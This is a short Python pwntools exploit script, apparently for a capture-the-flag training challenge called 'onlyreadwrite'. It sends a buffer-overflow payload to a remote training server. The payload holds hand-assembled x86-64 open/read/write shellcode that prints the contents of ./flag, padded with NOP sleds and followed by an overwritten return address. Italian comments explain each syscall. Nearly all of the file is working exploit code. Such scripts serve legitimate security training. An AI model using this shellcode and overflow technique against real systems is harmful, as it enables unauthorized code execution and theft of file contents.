from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./onlyreadwrite")
p = remote("training.jinblack.it", 2006)
#gdb.attach(p, '''	b *0x401482''')
#context.log_level = 'debug'

raw_input("Wait")

flagAddress = 0x004040c0

bufferAddress = 0x004040d0

#OPEN FILE
# mov rax, 0x02 <- open opcode
# mov rdi, 0x004040c0 <- puntatore a file path (metto ./flag in memoria e punto a quella posizione)
# mov rdx, 0x0 
# mov rsi, 0x0
# syscall

#<- file pointer della open e' in rax

#READ FROM FILE
# mov rdi, rax <- fd file aperto
# mov rax, 0x0 <- opcode read
# mov rsi, 0x404220 <- posizione in cui metto le cose lette
# mov rdx, 0x60 <- quantita' di byte letta
# syscall

#WRITE ON STDOUTPUT
# mov rax, 0x01 <- opcode write
# mov rdi, 0x01 <- stdoutput
# mov rsi, 0x404220 <- posizione da scrivere
# mov rdx, 0x60 <- byte scritti
# syscall

stuff = "\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\xC7\xC2\x00\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC6\x20\x42\x40\x00\x48\xC7\xC2\x60\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\x20\x42\x40\x00\x48\xC7\xC2\x60\x00\x00\x00\x0F\x05"

flag = "./flag\x00"

payload = flag + "\x90"*20 + stuff + "\x90"*(1016-len(stuff)-len(flag)-20) + p64(bufferAddress)

p.send(payload)

p.interactive()